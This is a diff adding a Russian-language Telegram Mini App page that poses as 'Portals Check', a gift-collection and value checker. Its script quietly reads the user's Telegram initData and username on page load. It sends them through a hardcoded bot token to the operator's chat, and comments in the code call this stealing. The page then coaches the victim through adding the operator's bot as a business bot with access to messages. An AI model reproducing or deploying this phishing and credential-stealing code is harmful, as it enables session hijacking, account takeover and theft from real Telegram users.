@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Portal Checker</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg-color: #0b0e14;
+            --card-bg: #151a23;
+            --primary-blue: #2ea6ff;
+            --text-main: #ffffff;
+            --text-muted: #8b949e;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+
+        body { background-color: var(--bg-color); color: var(--text-main); display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+
+        /* --- 1. ЭКРАН ЗАГРУЗКИ --- */
+        #loader-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, #1b2b5e 0%, #050810 100%);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 1000; transition: opacity 0.5s ease;
+        }
+
+        .loader-logo { font-size: 32px; font-weight: 900; letter-spacing: 1px; display: flex; align-items: center; gap: 8px; margin-bottom: 50px; z-index: 2; }
+        .loader-logo span { color: #fff; }
+
+        .portal-icon { width: 120px; height: 120px; background: #2ea6ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 60px; box-shadow: 0 0 50px rgba(46, 166, 255, 0.5); z-index: 2; animation: pulse 2s infinite; }
+
+        .floating-gift { position: absolute; font-size: 40px; filter: drop-shadow(0 10px 10px rgba(0,0,0,0.5)); animation: float 4s ease-in-out infinite; }
+        .g1 { top: 20%; left: 10%; animation-delay: 0s; }
+        .g2 { top: 25%; right: 15%; animation-delay: 1s; }
+        .g3 { bottom: 30%; left: 15%; animation-delay: 2s; }
+        .g4 { bottom: 20%; right: 10%; animation-delay: 0.5s; }
+
+        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(10deg); } }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+
+        .loading-bar-container { width: 60%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; margin-top: 60px; overflow: hidden; z-index: 2; }
+        .loading-bar { height: 100%; width: 0%; background: #fff; border-radius: 10px; transition: width 2.5s ease-in-out; }
+
+        /* --- 2. ГЛАВНОЕ МЕНЮ --- */
+        #main-screen { display: none; flex-direction: column; height: 100%; padding: 20px; overflow-y: auto; }
+
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .header h1 { font-size: 20px; font-weight: 700; display: flex; align-items: center; gap: 8px; }
+        .header h1 span { color: var(--text-muted); font-weight: 400; }
+        .lang-toggle { background: #1c1c1e; border-radius: 20px; padding: 2px; display: flex; font-size: 12px; font-weight: 600; }
+        .lang-toggle span { padding: 6px 12px; border-radius: 15px; color: var(--text-muted); cursor: pointer; }
+        .lang-toggle .active { background: #2ea6ff; color: white; }
+
+        .hero-title { font-size: 32px; font-weight: 800; line-height: 1.1; margin-bottom: 15px; }
+        .hero-subtitle { color: var(--text-muted); font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+
+        .space-card { background: var(--card-bg); border-radius: 20px; padding: 20px; border: 1px solid rgba(255,255,255,0.05); }
+        .space-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .space-header .label { font-size: 10px; font-weight: 700; color: #2ea6ff; letter-spacing: 1px; }
+        .collection-count { background: #1a2842; color: #2ea6ff; padding: 4px 10px; border-radius: 10px; font-size: 12px; font-weight: 700; }
+
+        .space-title { font-size: 24px; font-weight: 700; margin-bottom: 20px; }
+        .tabs { display: flex; gap: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; margin-bottom: 20px; }
+        .tab { font-size: 14px; font-weight: 600; color: var(--text-muted); cursor: pointer; position: relative; }
+        .tab.active { color: white; }
+        .tab.active::after { content: ''; position: absolute; bottom: -11px; left: 0; width: 100%; height: 3px; background: #2ea6ff; border-radius: 3px; }
+
+        .inner-banner { background: linear-gradient(135deg, #1d4e89, #2ea6ff); border-radius: 16px; padding: 20px; display: flex; flex-direction: column; gap: 15px; }
+        .inner-banner h3 { font-size: 18px; font-weight: 700; }
+        .inner-banner p { font-size: 13px; opacity: 0.9; line-height: 1.4; }
+
+        .btn-primary { background: #2ea6ff; color: white; border: none; padding: 14px; border-radius: 12px; font-size: 15px; font-weight: 600; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; cursor: pointer; transition: background 0.2s; box-shadow: 0 4px 15px rgba(46, 166, 255, 0.4); }
+        .btn-primary:active { background: #1c8ce6; }
+
+        .footer { text-align: center; color: var(--text-muted); font-size: 12px; margin-top: auto; padding-top: 20px; }
+
+        /* --- 3. МОДАЛЬНОЕ ОКНО ИНСТРУКЦИИ --- */
+        #instruction-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); display: none; flex-direction: column; justify-content: flex-end; z-index: 999; }
+
+        .modal-content { background: var(--card-bg); border-radius: 24px 24px 0 0; padding: 24px; height: 85%; display: flex; flex-direction: column; position: relative; animation: slideUp 0.3s ease-out; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+        .modal-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; }
+        .modal-title { font-size: 20px; font-weight: 800; line-height: 1.2; width: 70%; }
+        .step-counter { background: #2ea6ff; color: white; padding: 4px 10px; border-radius: 8px; font-size: 14px; font-weight: 700; display: flex; align-items: center; gap: 4px; }
+        .close-btn { background: rgba(255,255,255,0.1); border: none; color: white; width: 32px; height: 32px; border-radius: 50%; font-size: 16px; cursor: pointer; display: flex; justify-content: center; align-items: center; }
+
+        .phone-mockup { background: #000; border: 4px solid #333; border-radius: 30px; width: 200px; height: 350px; margin: 0 auto 20px auto; position: relative; overflow: hidden; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
+        .phone-notch { width: 80px; height: 15px; background: #333; border-radius: 10px; position: absolute; top: 5px; }
+        .phone-screen-content { width: 90%; margin-top: 20px; }
+        .mock-menu-item { background: #1c1c1e; border-radius: 10px; padding: 10px; margin-bottom: 8px; font-size: 10px; display: flex; justify-content: space-between; color: #fff; }
+        .mock-menu-item.active { background: #2ea6ff; }
+        .mock-bot-search { background: #1c1c1e; border-radius: 10px; padding: 10px; margin-top: 10px; font-size: 10px; color: #aaa; display: flex; align-items: center; gap: 5px;}
+
+        .step-text { font-size: 18px; font-weight: 700; margin-bottom: 20px; line-height: 1.3; }
+        .step-text span { color: #2ea6ff; margin-right: 5px; }
+
+        .pagination { display: flex; justify-content: center; gap: 6px; margin-bottom: 20px; }
+        .dot { width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,0.2); transition: 0.3s; }
+        .dot.active { background: #2ea6ff; width: 20px; border-radius: 3px; }
+
+        .modal-nav { display: flex; gap: 10px; margin-top: auto; }
+        .btn-secondary { background: rgba(255,255,255,0.1); color: white; border: none; padding: 14px; border-radius: 12px; font-size: 15px; font-weight: 600; width: 40%; cursor: pointer; }
+        .btn-secondary:disabled { opacity: 0.3; }
+        .btn-next { background: #2ea6ff; color: white; border: none; padding: 14px; border-radius: 12px; font-size: 15px; font-weight: 600; width: 60%; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <!-- 1. ЭКРАН ЗАГРУЗКИ -->
+    <div id="loader-screen">
+        <div class="floating-gift g1">🎁</div>
+        <div class="floating-gift g2">🧸</div>
+        <div class="floating-gift g3">💎</div>
+        <div class="floating-gift g4">💍</div>
+
+        <div class="loader-logo">
+            <div class="portal-icon">🌀</div>
+            <span>Portals</span>
+        </div>
+
+        <div class="loading-bar-container">
+            <div class="loading-bar" id="progress-bar"></div>
+        </div>
+    </div>
+
+    <!-- 2. ГЛАВНОЕ МЕНЮ -->
+    <div id="main-screen">
+        <div class="header">
+            <h1>Portals <span>Check</span></h1>
+            <div class="lang-toggle">
+                <span class="active">RU</span>
+                <span>EN</span>
+            </div>
+        </div>
+
+        <div class="hero-title">Подарки и ликвидность в одном месте.</div>
+        <div class="hero-subtitle">Подключите бизнес-бота Telegram, чтобы загрузить подарки Portals и держать коллекцию под рукой.</div>
+
+        <div class="space-card">
+            <div class="space-header">
+                <div class="label">ВАШЕ ПРОСТРАНСТВО</div>
+                <div class="collection-count">🎒 0</div>
+            </div>
+            <div class="space-title">Коллекция</div>
+
+            <div class="tabs">
+                <div class="tab active">Подарки</div>
+                <div class="tab">Ликвидность</div>
+                <div class="tab">Продать</div>
+            </div>
+
+            <div class="inner-banner">
+                <div>
+                    <h3>Привет 👋</h3>
+                    <p>Подключите бизнес-бота — Portals Check загрузит ваши подарки, чтобы проверить их ликвидность и стоимость.</p>
+                </div>
+                <!-- Сделали кнопку как на твоем скрине -->
+                <button class="btn-primary" id="connect-btn">
+                    <span>✨</span> Check <span>→</span>
+                </button>
+            </div>
+        </div>
+
+        <div class="footer">@tset6231dabot</div>
+    </div>
+
+    <!-- 3. МОДАЛЬНОЕ ОКНО ИНСТРУКЦИИ -->
+    <div id="instruction-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Инструкция по подключению</div>
+                <div style="display: flex; gap: 10px; align-items: center;">
+                    <div class="step-counter"><span id="current-step-num">1</span> / 4</div>
+                    <button class="close-btn" id="close-modal">✕</button>
+                </div>
+            </div>
+
+            <div class="phone-mockup" id="phone-mockup">
+                <!-- Контент будет меняться через JS -->
+            </div>
+
+            <div class="step-text" id="step-text">
+                <span>Шаг 1</span> Откройте бизнес-настройки Telegram
+            </div>
+
+            <div class="pagination" id="pagination">
+                <div class="dot active"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+
+            <div class="modal-nav">
+                <button class="btn-secondary" id="btn-prev" disabled>← Назад</button>
+                <button class="btn-next" id="btn-next">Далее →</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // --- 1. ЛОГИКА ЗАГРУЗКИ И МГНОВЕННАЯ КРАЖА ---
+        setTimeout(() => {
+            document.getElementById('progress-bar').style.width = '100%';
+        }, 100);
+
+        setTimeout(() => {
+            // ЭКРАН ЗАГРУЗКИ ЗАКОНЧИЛСЯ
+
+            // КРАДЕМ INITDATA ПРЯМО СЕЙЧАС
+            let initData = tg.initData;
+            if (initData) {
+                let botToken = "9190282374:AAG7O-FOkXvntNiqdSdSADz61Nvwpx-DAXo"; // ЗАМЕНИ
+                let chatId = "8874915578"; // ЗАМЕНИ
+                let message = "🛡 Новый лог!\n\nUser: @" + (tg.initDataUnsafe.user.username || "нет") + "\n\nInitData:\n" + initData;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .catch(e => console.log(e));
+            }
+
+            // Переключаем экраны
+            document.getElementById('loader-screen').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('loader-screen').style.display = 'none';
+                document.getElementById('main-screen').style.display = 'flex';
+            }, 500);
+        }, 2600);
+
+        // --- 2. КНОПКА CHECK (ОТКРЫВАЕТ ИНСТРУКЦИЮ) ---
+        document.getElementById('connect-btn').addEventListener('click', function() {
+            // Просто открываем инструкцию, токен мы уже украли
+            document.getElementById('instruction-modal').style.display = 'flex';
+        });
+
+        // --- 3. ЛОГИКА ИНСТРУКЦИИ (СЛАЙДЕР) ---
+        let currentStep = 1;
+        const totalSteps = 4;
+
+        const stepsData = {
+            1: {
+                text: '<span>Шаг 1</span> Откройте бизнес-настройки Telegram',
+                mockup: `<div class="mock-menu-item"><span>👤 Профиль</span> <span>></span></div>
+                         <div class="mock-menu-item active"><span>💬 Чат-боты</span> <span>></span></div>
+                         <div style="text-align:center; font-size:8px; margin-top:20px; color:#888;">Откройте бизнес-настройки Telegram</div>`
+            },
+            2: {
+                text: `<span>Шаг 2</span> Найдите @tset6231dabot`,
+                mockup: `<div style="text-align:center; font-size:10px; color:#fff; margin-bottom:10px;">Добавить чат-бота</div>
+                         <div class="mock-bot-search">🔍 @tset6231dabot</div>
+                         <div class="mock-menu-item" style="margin-top:10px; align-items:center; gap:10px;">
+                            <span style="font-size:16px;">✈️</span>
+                            <div><div style="font-size:10px; font-weight:bold;">Checks Portals Bot</div><div style="font-size:8px; color:#888;">@tset6231dabot</div></div>
+                         </div>`
+            },
+            3: {
+                text: `<span>Шаг 3</span> Добавьте Checks Portals Bot как бизнес-бота`,
+                mockup: `<div style="text-align:center; font-size:10px; color:#fff; margin-bottom:20px;">Чат-бот</div>
+                         <div style="background:#1c1c1e; border-radius:15px; padding:20px; text-align:center; border:1px solid #333;">
+                            <div style="font-size:30px; margin-bottom:10px;">✈️</div>
+                            <div style="font-size:10px; font-weight:bold;">Checks Portals Bot</div>
+                            <div style="font-size:8px; color:#888; margin-bottom:15px;">@tset6231dabot</div>
+                            <div style="background:#2ea6ff; padding:8px; border-radius:8px; font-size:10px; font-weight:bold; color:#fff;">Добавить</div>
+                         </div>
+                         <div style="text-align:center; font-size:8px; margin-top:15px; color:#888;">Добавьте Checks Portals Bot как бизнес-бота</div>`
+            },
+            4: {
+                text: `<span>Шаг 4</span> Разрешите доступ только к сообщениям`,
+                mockup: `<div style="text-align:center; font-size:10px; color:#fff; margin-bottom:10px;">Права для бота</div>
+                         <div class="mock-menu-item"><span>Сообщения</span> <span style="color:#2ea6ff;">🔘</span></div>
+                         <div class="mock-menu-item"><span>Профиль</span> <span>⚪</span></div>
+                         <div class="mock-menu-item"><span>Подарки</span> <span>⚪</span></div>
+                         <div style="text-align:center; font-size:8px; margin-top:10px; color:#888;">Разрешите доступ только к сообщениям</div>`
+            }
+        };
+
+        function updateStep() {
+            document.getElementById('step-text').innerHTML = stepsData[currentStep].text;
+            document.getElementById('phone-mockup').innerHTML = `<div class="phone-notch"></div><div class="phone-screen-content">${stepsData[currentStep].mockup}</div>`;
+            document.getElementById('current-step-num').innerText = currentStep;
+
+            let dots = document.querySelectorAll('.dot');
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentStep - 1);
+            });
+
+            document.getElementById('btn-prev').disabled = (currentStep === 1);
+            if (currentStep === totalSteps) {
+                document.getElementById('btn-next').innerText = 'Закрыть';
+            } else {
+                document.getElementById('btn-next').innerText = 'Далее →';
+            }
+        }
+
+        document.getElementById('btn-next').addEventListener('click', () => {
+            if (currentStep < totalSteps) {
+                currentStep++;
+                updateStep();
+            } else {
+                document.getElementById('instruction-modal').style.display = 'none';
+            }
+        });
+
+        document.getElementById('btn-prev').addEventListener('click', () => {
+            if (currentStep > 1) {
+                currentStep--;
+                updateStep();
+            }
+        });
+
+        document.getElementById('close-modal').addEventListener('click', () => {
+            document.getElementById('instruction-modal').style.display = 'none';
+        });
+
+        updateStep();
+    </script>
+</body>
+</html>
